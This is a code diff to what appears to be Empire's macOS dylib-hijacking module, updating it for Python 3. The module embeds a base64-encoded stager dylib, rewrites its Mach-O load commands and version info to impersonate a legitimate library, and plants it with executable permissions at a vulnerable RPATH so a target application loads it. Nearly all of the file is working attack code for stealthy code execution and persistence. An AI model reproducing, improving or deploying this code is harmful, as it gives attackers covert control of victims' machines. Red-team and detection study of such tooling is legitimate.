@@ -2,6 +2,7 @@ import base64
 
 from empire.server.common.empire import MainMenu
 from empire.server.core.module_models import EmpireModule
+from empire.server.utils import module_util
 
 
 class Module:
@@ -34,22 +35,28 @@ class Module:
         dylib_bytes = main_menu.stagergenv2.generate_dylib(
             launcher_code=launcher, arch=arch, hijacker=True
         )
-        encoded_dylib = base64.b64encode(dylib_bytes)
+        module_util.ensure_python3_macho_template(
+            dylib_bytes,
+            "data/misc/" + main_menu.stagergenv2.dylib_template_name(arch, True),
+        )
+        encoded_dylib = base64.b64encode(dylib_bytes).decode()
         dylib = params["LegitimateDylibPath"]
         vrpath = params["VulnerableRPATH"]
 
         return f"""
-from ctypes import *
+import base64
+import os
+import tempfile
+
+TARGET_DYLIB = {dylib!r}
+VR_PATH = {vrpath!r}
+
 def run(attackerDYLIB):
 
     import ctypes
     import io
-    import os
-    import sys
-    import fcntl
     import shutil
     import struct
-    import stat
 
 
     LC_REQ_DYLD = 0x80000000
@@ -137,16 +144,12 @@ def run(attackerDYLIB):
             print('ERROR: dylib \\'%s\\' not found' % (targetDYLIB))
             return False
 
-        attacker = open(attackerDYLIB)
-        target = open(targetDYLIB)
-
-        attackerHeader = mach_header.from_buffer_copy(attacker.read(28))
-        targetHeader = mach_header.from_buffer_copy(target.read(28))
+        with open(attackerDYLIB, 'rb') as attacker, open(targetDYLIB, 'rb') as target:
+            attackerHeader = mach_header.from_buffer_copy(attacker.read(28))
+            targetHeader = mach_header.from_buffer_copy(target.read(28))
 
         if attackerHeader.cputype != targetHeader.cputype:
             print('ERROR: Architecture mismatch')
-            attacker.close()
-            target.close()
             return False
 
         return True
@@ -182,10 +185,10 @@ def run(attackerDYLIB):
                 current = fileHandle.tell()
 
         #exceptions
-        except Exception, e:
+        except Exception as e:
 
             #err msg
-            print('EXCEPTION (finding load commands): %s' % e)
+            print('EXCEPTION (finding load commands): %s: %s' % (type(e).__name__, e))
 
             #reset
             matchedOffsets = None
@@ -201,7 +204,7 @@ def run(attackerDYLIB):
         try:
 
             #dbg msg
-            print(' [+] parsing \\'%s\\' to extract version info' % (os.path.split(targetDYLIB)[1])_
+            print(' [+] parsing \\'%s\\' to extract version info' % (os.path.split(targetDYLIB)[1]))
 
             #open target .dylib
             fileHandle = open(targetDYLIB, 'rb')
@@ -285,11 +288,11 @@ def run(attackerDYLIB):
             #close
             fileHandle.close()
 
-        except Exception, e:
+        except Exception as e:
 
             #err msg
-            print('EXCEPTION (configuring version info): %s' % e)
-
+            print('EXCEPTION (configuring version info): %s: %s' % (type(e).__name__, e))
+            return False
 
         return True
 
@@ -356,29 +359,25 @@ def run(attackerDYLIB):
                 #dbg msg
                 print('     computed path size: 0x%x' % (pathSize))
 
-                #read out path
-                data = targetDYLIB + '\\0' * (pathSize - len(targetDYLIB))
-                fileHandle.write(data)
-
-                #path can include NULLs so lets chop those off
-                #path = path.rstrip('\0')
-
-                #dbg msg(s)
-                #print '     extracted faux path: %s' % (path)
-
-                #close
-                fileHandle.close()
+                #write out path, NUL padded; it must leave room for a terminator
+                targetBytes = targetDYLIB.encode()
+                if len(targetBytes) >= pathSize:
+                    print('ERROR: target path too long for re-export slot (%d >= %d bytes)' % (len(targetBytes), pathSize))
+                    fileHandle.close()
+                    return False
+                fileHandle.write(targetBytes + b'\\0' * (pathSize - len(targetBytes)))
 
                 #dbg msg
                 print(' [+] updated embedded re-export')
 
-                #wrap
+            #close
+            fileHandle.close()
 
         #handle exceptions
-        except Exception, e:
+        except Exception as e:
 
             #err msg
-            print('EXCEPTION (configuring re-exports): %s' % e)
+            print('EXCEPTION (configuring re-exports): %s: %s' % (type(e).__name__, e))
 
             #bail
             return False
@@ -410,66 +409,36 @@ def run(attackerDYLIB):
         return True
 
 
-    #target .dylib
-    targetDYLIB = "{dylib}"
+    targetDYLIB = TARGET_DYLIB
+    vrpath = VR_PATH
 
-    vrpath = "{vrpath}"
-
-
-    #configured .dylib
-    configuredDYLIB = ""
-
-    #init output path for configured .dylib
-    configuredDYLIB = os.path.split(attackerDYLIB)[0]+'/' + os.path.split(targetDYLIB)[1]
-
-    #dbg msg
     print(' [+] configuring %s to hijack %s' % (os.path.split(attackerDYLIB)[1], os.path.split(targetDYLIB)[1]))
 
-    #check prereqs
-    # ->i.e. sanity checks
     if not checkPrereqs(attackerDYLIB, targetDYLIB):
-
-        #err msg
         print('ERROR: prerequisite check failed\\n')
+        return False
 
-        #bail
-        return ""
-
-    #configure the provide .dylib
     if not configure(attackerDYLIB, targetDYLIB):
-
-        #err msg
         print('ERROR: failed to configure %s\\n' % (os.path.split(targetDYLIB)[1]))
+        return False
 
-        #bail
-        return ""
+    if not os.path.dirname(vrpath) or os.path.isdir(vrpath):
+        print('ERROR: VulnerableRPATH must be a full file path, got %s' % (vrpath))
+        return False
+    os.makedirs(os.path.dirname(vrpath), exist_ok=True)
+    shutil.copy2(attackerDYLIB, vrpath)
+    os.chmod(vrpath, 0o755)
+    print('\\nHijacker configured and copied to %s' % (vrpath))
+    return True
 
-    #dbg msg
-    print(' [+] copying configured .dylib to %s' % (configuredDYLIB))
-
-    #make a (local) copy w/ name
-    shutil.copy2(attackerDYLIB, configuredDYLIB)
-
-    os.remove(attackerDYLIB)
-    if not os.path.exists(os.path.split(vrpath)[0]):
-        os.makedirs(os.path.split(vrpath)[0])
-
-    os.chmod(configuredDYLIB, 0777)
-    shutil.copy2(configuredDYLIB, vrpath)
-
-    os.remove(configuredDYLIB)
-    #dbg msg
-
-    print('\\nHijacker created, renamed to %s, and copied to %s' % (configuredDYLIB,vrpath))
-
-import base64
-import uuid
-encbytes = "{encoded_dylib}"
-filename = str(uuid.uuid4())
-path = "/tmp/" + filename + ".dylib"
-decodedDylib = base64.b64decode(encbytes)
-temp = open(path,'wb')
-temp.write(decodedDylib)
-temp.close()
-run(path)
+fd, attackerPath = tempfile.mkstemp(suffix='.dylib')
+with os.fdopen(fd, 'wb') as temp:
+    temp.write(base64.b64decode("{encoded_dylib}"))
+try:
+    ok = run(attackerPath)
+finally:
+    os.remove(attackerPath)
+if not ok:
+    print('[!] CreateHijacker FAILED: nothing planted at %s' % (VR_PATH))
+    raise RuntimeError('CreateHijacker failed; see output above')
 """
